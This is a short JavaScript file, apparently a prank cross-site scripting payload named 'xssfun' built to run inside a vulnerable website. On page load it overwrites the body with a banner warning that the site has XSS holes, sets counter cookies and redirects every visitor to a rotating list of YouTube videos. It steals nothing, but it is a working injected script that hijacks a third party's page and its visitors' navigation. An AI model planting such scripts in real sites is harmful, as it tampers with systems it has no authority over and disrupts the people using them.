function getCookie(cname) {
  var name = cname + "=";
  var decodedCookie = decodeURIComponent(document.cookie);
  var ca = decodedCookie.split(';');
  for(var i = 0; i <ca.length; i++) {
    var c = ca[i];
    while (c.charAt(0) == ' ') {
      c = c.substring(1);
    }
    if (c.indexOf(name) == 0) {
      return c.substring(name.length, c.length);
    }
  }
  return false;
}

function setCookie(cname, cvalue, seconds) {
  var d = new Date();
  d.setTime(d.getTime() + (seconds*1000));
  var expires = "expires="+ d.toUTCString();
  document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
  console.log(cname + "=" + cvalue + ";" + expires + ";path=/");
}


let videos = [
  'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
  'https://www.youtube.com/watch?v=MNyG-xu-7SQ',
  'https://www.youtube.com/watch?v=b2OYNMO_mNw',
  'https://www.youtube.com/watch?v=KXzNo0vR_dU',
  'https://www.youtube.com/watch?v=RfiQYRn7fBg',
  'https://www.youtube.com/watch?v=9RRGvAB4HF8',
  'https://www.youtube.com/watch?v=u1Ds9CeG-VY',
  'https://www.youtube.com/watch?v=0PxTAn4g20U0',
  'https://www.youtube.com/watch?v=mTr_HS_O4Ek',
  'https://www.youtube.com/watch?v=_G3NT91AWUE',
  'https://www.youtube.com/watch?v=4U9MI0u2VIE',
  'https://www.youtube.com/watch?v=9C_HReR_McQ',
  'https://www.youtube.com/watch?v=FBaVwwuErmU',
  'https://www.youtube.com/watch?v=33WuGp6fs3s',
  'https://www.youtube.com/watch?v=T4kBRC2co7Y'
];

if (getCookie('xssfunSleep') === false) {
  document.body.innerHTML = '<style>body {margin: 0;}</style>    <div style="display: inline-block; padding: 1em;font-size: 200%;background-color: #CC0000; color: white; font-family: sans-serif;font-weight:bolder;text-align:center"><span style="float: right;"><svg xmlns="http://www.w3.org/2000/svg" width="4em" height="4em" fill="white" class="bi bi-exclamation-triangle" viewBox="0 0 16 16"><path d="M7.938 2.016A.13.13 0 0 1 8.002 2a.13.13 0 0 1 .063.016.146.146 0 0 1 .054.057l6.857 11.667c.036.06.035.124.002.183a.163.163 0 0 1-.054.06.116.116 0 0 1-.066.017H1.146a.115.115 0 0 1-.066-.017.163.163 0 0 1-.054-.06.176.176 0 0 1 .002-.183L7.884 2.073a.147.147 0 0 1 .054-.057zm1.044-.45a1.13 1.13 0 0 0-1.96 0L.165 13.233c-.457.778.091 1.767.98 1.767h13.713c.889 0 1.438-.99.98-1.767L8.982 1.566z"/><path d="M7.002 12a1 1 0 1 1 2 0 1 1 0 0 1-2 0zM7.1 5.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0L7.1 5.995z"/></svg></span><span>WARNING: This web site is not safe. It has Cross Site Scripting (XSS) security vulnerabilities. You should stop using this site and contact the owner.</span></div>' + document.body.innerHTML;
  setCookie('xssfunSleep', 'sleep', 6000);
}

// If cookie not set at all
if (getCookie('xssfunVideoCounter') === false) {
  setCookie('xssfunVideoCounter', 1);
} else {
  setCookie('xssfunVideoCounter', Number(getCookie('xssfunVideoCounter')) + 1);    
  console.log('else');
}
window.location.replace(videos[getCookie('xssfunVideoCounter') % videos.length]);


